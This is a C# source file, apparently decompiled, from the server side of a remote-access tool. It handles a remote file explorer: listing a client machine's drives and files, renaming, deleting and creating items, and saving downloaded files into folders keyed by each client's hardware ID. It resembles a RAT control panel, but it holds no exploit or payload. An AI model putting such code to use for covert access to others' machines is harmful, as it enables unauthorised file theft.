using System.Collections;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Leb128;
using Server.Connectings;
using Server.Forms;
using Server.Helper;

namespace Server.Messages;

internal class HandlerExplorer
{
	public static void Read(Clients client, object[] objects)
	{
		if (client == null || objects == null || objects.Length < 2)
		{
			if (client != null)
			{
				client.Disconnect();
			}
			return;
		}
		string text = (string)objects[1];
		if (text == null)
		{
			return;
		}
		switch (text.Length)
		{
		case 5:
		{
			char c2 = text[0];
			if (c2 != 'E')
			{
				if (c2 != 'F' || !(text == "Files"))
				{
					break;
				}
				if (client.Tag == null)
				{
					client.Disconnect();
					break;
				}
				FormExplorer form5 = (FormExplorer)client.Tag;
				form5.Invoke((MethodInvoker)delegate
				{
					form5.rjTextBox1.Texts = (string)objects[2];
					form5.materialLabel1.Text = "Succues Get Folder's and File's";
					form5.dataGridView2.Rows.Clear();
					DataGridViewRow dataGridViewRow = new DataGridViewRow
					{
						Cells = 
						{
							(DataGridViewCell)new DataGridViewImageCell
							{
								Value = form5.imageList1.Images["folder.png"],
								Tag = 2,
								ImageLayout = DataGridViewImageCellLayout.Zoom
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = "..."
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = ""
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = ""
							}
						}
					};
					form5.dataGridView2.Rows.Add(dataGridViewRow);
					object[] array = LEB128.Read((byte[])objects[3]);
					int num = 0;
					while (num < array.Length)
					{
						string value = (string)array[num++];
						string value2 = (string)array[num++];
						string value3 = (string)array[num++];
						DataGridViewRow dataGridViewRow2 = new DataGridViewRow
						{
							Cells = 
							{
								(DataGridViewCell)new DataGridViewImageCell
								{
									Value = form5.imageList1.Images["folder.png"],
									Tag = 1,
									ImageLayout = DataGridViewImageCellLayout.Zoom
								},
								(DataGridViewCell)new DataGridViewTextBoxCell
								{
									Value = value
								},
								(DataGridViewCell)new DataGridViewTextBoxCell
								{
									Value = value3
								},
								(DataGridViewCell)new DataGridViewTextBoxCell
								{
									Value = value2
								},
								(DataGridViewCell)new DataGridViewTextBoxCell
								{
									Value = ""
								}
							}
						};
						form5.dataGridView2.Rows.Add(dataGridViewRow2);
					}
					object[] array2 = LEB128.Read((byte[])objects[4]);
					object[] list = LEB128.Read((byte[])objects[5]);
					int num2 = 0;
					while (num2 < array2.Length)
					{
						string value4 = (string)array2[num2++];
						string hash = (string)array2[num2++];
						string value5 = (string)array2[num2++];
						string value6 = (string)array2[num2++];
						long byteCount = (long)array2[num2++];
						DataGridViewRow dataGridViewRow3 = new DataGridViewRow();
						using (MemoryStream stream = new MemoryStream(Methods.getIcon(hash, list)))
						{
							dataGridViewRow3.Cells.Add(new DataGridViewImageCell
							{
								Value = Image.FromStream(stream),
								Tag = 0,
								ImageLayout = DataGridViewImageCellLayout.Zoom
							});
						}
						dataGridViewRow3.Cells.Add(new DataGridViewTextBoxCell
						{
							Value = value4
						});
						dataGridViewRow3.Cells.Add(new DataGridViewTextBoxCell
						{
							Value = value6
						});
						dataGridViewRow3.Cells.Add(new DataGridViewTextBoxCell
						{
							Value = value5
						});
						dataGridViewRow3.Cells.Add(new DataGridViewTextBoxCell
						{
							Value = Methods.BytesToString(byteCount)
						});
						form5.dataGridView2.Rows.Add(dataGridViewRow3);
					}
					form5.dataGridView1.Enabled = true;
					form5.dataGridView2.Enabled = true;
					form5.dataGridView3.Enabled = true;
				});
			}
			else
			{
				if (!(text == "Error"))
				{
					break;
				}
				if (client.Tag == null)
				{
					client.Disconnect();
					break;
				}
				FormExplorer form6 = (FormExplorer)client.Tag;
				form6.Invoke((MethodInvoker)delegate
				{
					form6.materialLabel1.Text = "Error: " + (string)objects[2];
					form6.dataGridView1.Enabled = true;
					form6.dataGridView2.Enabled = true;
					form6.dataGridView3.Enabled = true;
				});
			}
			break;
		}
		case 7:
		{
			char c = text[0];
			switch (c)
			{
			default:
			{
				if (c != 'R' || !(text == "Renamed"))
				{
					break;
				}
				if (client.Tag == null)
				{
					client.Disconnect();
					break;
				}
				FormExplorer form3 = (FormExplorer)client.Tag;
				form3.Invoke((MethodInvoker)delegate
				{
					form3.materialLabel1.Text = "Renamed file or directory";
					foreach (DataGridViewRow dataGridViewRow in (IEnumerable)form3.dataGridView2.Rows)
					{
						if ((string)dataGridViewRow.Cells[1].Value == (string)objects[2])
						{
							dataGridViewRow.Cells[1].Value = (string)objects[3];
							dataGridViewRow.Cells[2].Value = (string)objects[4];
							dataGridViewRow.Cells[3].Value = (string)objects[5];
							if (objects.Length > 5)
							{
								using (MemoryStream stream = new MemoryStream((byte[])objects[6]))
								{
									dataGridViewRow.Cells[0].Value = Image.FromStream(stream);
								}
								dataGridViewRow.Cells[4].Value = Methods.BytesToString((long)objects[7]);
							}
							break;
						}
					}
				});
				break;
			}
			case 'D':
			{
				if (!(text == "Deleted"))
				{
					break;
				}
				if (client.Tag == null)
				{
					client.Disconnect();
					break;
				}
				FormExplorer form4 = (FormExplorer)client.Tag;
				form4.Invoke((MethodInvoker)delegate
				{
					form4.materialLabel1.Text = "Deleted file or directory";
					foreach (DataGridViewRow dataGridViewRow in (IEnumerable)form4.dataGridView2.Rows)
					{
						if ((string)dataGridViewRow.Cells[1].Value == (string)objects[2])
						{
							form4.dataGridView2.Rows.Remove(dataGridViewRow);
							break;
						}
					}
				});
				break;
			}
			case 'C':
			{
				if (!(text == "Connect"))
				{
					break;
				}
				FormExplorer form2 = (FormExplorer)Application.OpenForms["Explorer:" + (string)objects[2]];
				if (form2 == null)
				{
					client.Disconnect();
					break;
				}
				string hwid2 = SecurityHelper.SanitizeHwid((string)objects[2]);
				form2.Invoke((MethodInvoker)delegate
				{
					form2.Text = "Explorer [" + (string)objects[2] + "]";
					form2.client = client;
					form2.materialLabel1.Text = "Succues Connect";
					string[] array = ((string)objects[3]).Split(',');
					foreach (string value in array)
					{
						DataGridViewRow dataGridViewRow = new DataGridViewRow
						{
							Cells = 
							{
								(DataGridViewCell)new DataGridViewImageCell
								{
									Value = form2.imageList1.Images["folder.png"]
								},
								(DataGridViewCell)new DataGridViewTextBoxCell
								{
									Value = value
								}
							}
						};
						form2.dataGridView3.Rows.Add(dataGridViewRow);
					}
					array = ((string)objects[4]).Split(',');
					foreach (string text2 in array)
					{
						string value2 = text2.Split(';')[0];
						string obj2 = text2.Split(';')[1];
						DataGridViewRow dataGridViewRow2 = new DataGridViewRow();
						if (obj2 == "Drive")
						{
							dataGridViewRow2.Cells.Add(new DataGridViewImageCell
							{
								Value = form2.imageList1.Images["hard-disk.png"]
							});
						}
						else
						{
							dataGridViewRow2.Cells.Add(new DataGridViewImageCell
							{
								Value = form2.imageList1.Images["usb-drive.png"]
							});
						}
						dataGridViewRow2.Cells.Add(new DataGridViewTextBoxCell
						{
							Value = value2
						});
						form2.dataGridView1.Rows.Add(dataGridViewRow2);
					}
					form2.dataGridView1.Enabled = true;
					form2.dataGridView2.Enabled = true;
					form2.dataGridView3.Enabled = true;
				});
				client.Tag = form2;
				client.Hwid = hwid2;
				break;
			}
			}
			break;
		}
		case 10:
		{
			if (!(text == "CreatedDir"))
			{
				break;
			}
			if (client.Tag == null)
			{
				client.Disconnect();
				break;
			}
			FormExplorer form9 = (FormExplorer)client.Tag;
			form9.Invoke((MethodInvoker)delegate
			{
				form9.materialLabel1.Text = "Created New Directory";
				DataGridViewRow dataGridViewRow = new DataGridViewRow
				{
					Cells = 
					{
						(DataGridViewCell)new DataGridViewImageCell
						{
							Value = form9.imageList1.Images["folder.png"],
							Tag = 1,
							ImageLayout = DataGridViewImageCellLayout.Zoom
						},
						(DataGridViewCell)new DataGridViewTextBoxCell
						{
							Value = (string)objects[2]
						},
						(DataGridViewCell)new DataGridViewTextBoxCell
						{
							Value = (string)objects[3]
						},
						(DataGridViewCell)new DataGridViewTextBoxCell
						{
							Value = (string)objects[4]
						},
						(DataGridViewCell)new DataGridViewTextBoxCell
						{
							Value = ""
						}
					}
				};
				form9.dataGridView2.Rows.Add(dataGridViewRow);
				form9.dataGridView2.Sort(new CustomComparer());
			});
			break;
		}
		case 11:
		{
			if (!(text == "CreatedFile"))
			{
				break;
			}
			if (client.Tag == null)
			{
				client.Disconnect();
				break;
			}
			FormExplorer form8 = (FormExplorer)client.Tag;
			form8.Invoke((MethodInvoker)delegate
			{
				form8.materialLabel1.Text = "Created New File";
				DataGridViewRow dataGridViewRow = new DataGridViewRow();
				using (MemoryStream stream = new MemoryStream((byte[])objects[2]))
				{
					dataGridViewRow.Cells.Add(new DataGridViewImageCell
					{
						Value = Image.FromStream(stream),
						Tag = 0,
						ImageLayout = DataGridViewImageCellLayout.Zoom
					});
				}
				dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = (string)objects[3]
				});
				dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = (string)objects[4]
				});
				dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = (string)objects[5]
				});
				dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = Methods.BytesToString((long)objects[6])
				});
				form8.dataGridView2.Rows.Add(dataGridViewRow);
				form8.dataGridView2.Sort(new CustomComparer());
			});
			break;
		}
		case 12:
		{
			if (!(text == "DownloadFile"))
			{
				break;
			}
			if (client.Tag == null)
			{
				client.Disconnect();
				break;
			}
			FormDownload obj = (FormDownload)client.Tag;
			obj.Close();
			string downloadPath = Path.Combine(path3: SecurityHelper.SanitizeHwid(client.Hwid), path1: Application.StartupPath, path2: "Users", path4: "Downloads");
			if (!Directory.Exists(downloadPath))
			{
				Directory.CreateDirectory(downloadPath);
			}
			string fileName = Path.GetFileName(obj.NameFile);
			File.WriteAllBytes(Path.Combine(downloadPath, fileName), (byte[])objects[2]);
			client.Disconnect();
			break;
		}
		case 13:
		{
			if (!(text == "UploadConnect"))
			{
				break;
			}
			FormUpload form7 = (FormUpload)Application.OpenForms[(string)objects[2]];
			if (form7 == null)
			{
				client.Disconnect();
				break;
			}
			form7.Invoke((MethodInvoker)delegate
			{
				form7.client = client;
				form7.Connected();
			});
			client.SendChunk(LEB128.Write(new object[3] { "Uploaded", form7.pathto, form7.bytes }));
			break;
		}
		case 15:
		{
			if (!(text == "DownloadConnect"))
			{
				break;
			}
			FormExplorer form1 = (FormExplorer)Application.OpenForms["Explorer:" + (string)objects[2]];
			if (form1 == null)
			{
				client.Disconnect();
				break;
			}
			string hwid = SecurityHelper.SanitizeHwid((string)objects[2]);
			client.Hwid = hwid;
			form1.Invoke((MethodInvoker)delegate
			{
				FormDownload formDownload = new FormDownload
				{
					Text = "Download: " + (string)objects[2],
					Name = "Download: " + (string)objects[2] + "." + (string)objects[4],
					parrent = form1.client,
					client = client,
					SizeFile = (long)objects[3],
					NameFile = (string)objects[4]
				};
				client.Tag = formDownload;
				formDownload.Show();
			});
			break;
		}
		case 6:
		case 8:
		case 9:
		case 14:
			break;
		}
	}
}
